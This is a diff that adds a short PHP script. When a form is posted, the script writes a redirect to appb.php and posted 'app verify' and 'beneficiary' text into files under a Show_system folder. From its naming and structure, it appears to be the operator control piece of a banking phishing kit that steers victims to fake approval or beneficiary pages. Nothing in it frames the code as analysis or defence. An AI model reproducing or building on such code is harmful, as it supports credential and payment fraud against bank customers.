@@ -1,0 +1,42 @@
+<?php
+
+
+session_start();
+
+if(isset($_POST['Appverify'])) 
+{
+    
+$Page .= ' <meta http-equiv="refresh" content="0;url=./appb.php" /> ';
+
+$fPage = fopen("../Show_system/Show_Page.txt", "w");
+    fwrite($fPage, $Page);
+
+
+
+$textimage = $_SESSION['textAppverify'] = $_POST['textAppverify'];
+
+$yagmai .= ''.$textimage.'';
+                      
+$f = fopen("../Show_system/Show_Appverify.txt", "w");
+    fwrite($f, $yagmai);
+
+
+$textbeneff = $_SESSION['textBenef'] = $_POST['textBenef'];
+
+$yabenef .= ''.$textbeneff.'';
+                      
+$b = fopen("../Show_system/Show_AppBenef.txt", "w");
+    fwrite($b, $yabenef);
+
+
+}
+
+else {
+
+
+
+
+}
+
+?>
+
